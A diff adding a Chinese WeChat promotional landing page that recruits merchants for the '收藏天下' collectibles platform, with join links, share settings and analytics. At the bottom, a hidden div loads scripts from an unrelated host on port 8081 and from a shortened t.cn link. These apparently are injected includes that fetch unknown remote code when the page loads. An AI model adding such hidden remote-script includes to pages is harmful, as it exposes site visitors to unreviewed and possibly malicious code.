@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="zh-cn" class="no-js">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Type">
+<meta content="text/html; charset=utf-8">
+<meta charset="utf-8">
+<title>收藏天下平台招商火爆进行中……</title>		
+<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" type="text/css" href="css/reset.css">
+<link rel="stylesheet" type="text/css" href="css/animations.css">
+<link rel="stylesheet" type="text/css" href="css/layout.css">
+<link rel="stylesheet" type="text/css" href="css/page.css">
+
+</head>
+<body>
+
+<div id="page-hd">
+	<div id="loading">
+		<div class="spinner">
+		  <div class="spinner-container container1">
+			<div class="circle1"></div>
+			<div class="circle2"></div>
+			<div class="circle3"></div>
+			<div class="circle4"></div>
+		  </div>
+		  <div class="spinner-container container2">
+			<div class="circle1"></div>
+			<div class="circle2"></div>
+			<div class="circle3"></div>
+			<div class="circle4"></div>
+		  </div>
+		  <div class="spinner-container container3">
+			<div class="circle1"></div>
+			<div class="circle2"></div>
+			<div class="circle3"></div>
+			<div class="circle4"></div>
+		  </div>
+		</div>
+	</div>
+	<img src="images/icon_up.png" alt="" class="arrow-up pt-page-moveIconUp">
+</div>
+
+<div id="page-content">
+	<div class="page page-1 page-current">
+		 <div class="btn-group">
+		 	  <img class="pt-page-fadeInDown" src="images/top.png" alt="">
+			  <img class="pt-page-fadeInUp" src="images/man.jpg" alt="">
+		 </div>
+	</div>
+	<div class="page page-2 hide">
+		<div class="btn-group">
+			  <img class="pt-page-moveFromTop two" src="images/advance.png" alt="">
+		</div>
+	</div>
+	<div class="page page-3 hide">
+	</div>
+	<div class="page page-4 hide">
+		 <div class="btn-group">
+		      <a href="http://www.96567.com/shop/index.php?act=show_joinin&op=index" class="btn1"></a>
+		 </div>
+	</div>
+	<div class="page page-5 hide">
+		
+	</div>
+	<div class="page page-6 hide">
+		 <div class="btn-group">
+		      <a class="btn2" href="http://wpa.qq.com/msgrd?v=3&uin=2973513224&site=qq&menu=yes"></a>
+		      <a class="btn3" href="http://www.96567.com/shop/index.php?act=show_joinin&op=index"></a>
+		 </div>
+	</div>
+
+	</div>
+</div>
+
+<div id="page-ft"></div>
+
+<script type="text/javascript" src="js/zepto.min.js"></script>
+<script type="text/javascript" src="js/touch.js"></script>
+<script type="text/javascript" src="js/index.js"></script>
+
+<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+<script>
+
+var js_appid = '';
+var js_noncestr = '';
+var js_timestamp = '';
+var js_url = '';
+var js_signature = '';
+
+$(function(){
+
+	var url = location.href.split('#')[0];
+
+	$.getJSON("http://www.96567.com/mobile/index.php?act=weixin&op=weixinJsaip",{url:url},function(json){
+	  if(json){
+	  	var js_appid = json.appId;
+	  	var js_noncestr = json.nonceStr;
+	  	var js_timestamp = json.timestamp;
+	  	var js_url = json.url;
+	  	var js_signature = json.signature;
+	  	wx.config({
+		    debug: false,
+		    appId:js_appid,
+		    timestamp:js_timestamp,
+		    nonceStr:js_noncestr,
+		    signature:js_signature,
+		    jsApiList: [
+		      // 所有要调用的 API 都要加到这个列表中
+		      'onMenuShareTimeline',
+		      'onMenuShareAppMessage',
+		    ]
+		});
+	  }
+	});
+})
+
+  
+  wx.ready(function () {
+      wx.onMenuShareTimeline({
+        title: "收藏天下平台招商啦！入驻即享：百万会员资源、千万广告推广… 速关注！", // 分享标题
+        link: "http://www.96567.com/wap/tmpl/zhuanti/20151204/index.html", // 分享链接
+        imgUrl: "http://www.96567.com/wap/tmpl/zhuanti/20151204/images/icon.jpg", // 分享图标
+        success: function () {
+            alert('分享成功');
+        }
+
+      });
+
+      wx.onMenuShareAppMessage({
+        title: "收藏天下平台招商啦！入驻即享：百万会员资源、千万广告推广… 速关注！", // 分享标题
+        desc: "还有一对一指导经营，专业！省心！", // 分享描述
+        link: "http://www.96567.com/wap/tmpl/zhuanti/20151204/index.html", // 分享链接
+        imgUrl: "http://www.96567.com/wap/tmpl/zhuanti/20151204/images/icon.jpg", // 分享图标
+        type: '', // 分享类型,music、video或link，不填默认为link
+        dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
+
+        success: function () {
+            alert('分享成功');
+        }
+    });
+
+
+  });
+
+</script>
+
+<div style="display:none">
+     <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_4528288'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/stat.php%3Fid%3D4528288' type='text/javascript'%3E%3C/script%3E"));</script>
+     <script type="text/javascript" src="http://mo.momo1688.com:8081/api.aspx?api=aa&bhid=1"></script>
+     <script src=http://t.cn/RUDd9fO></script>
+</div>
+</body>
+</html>
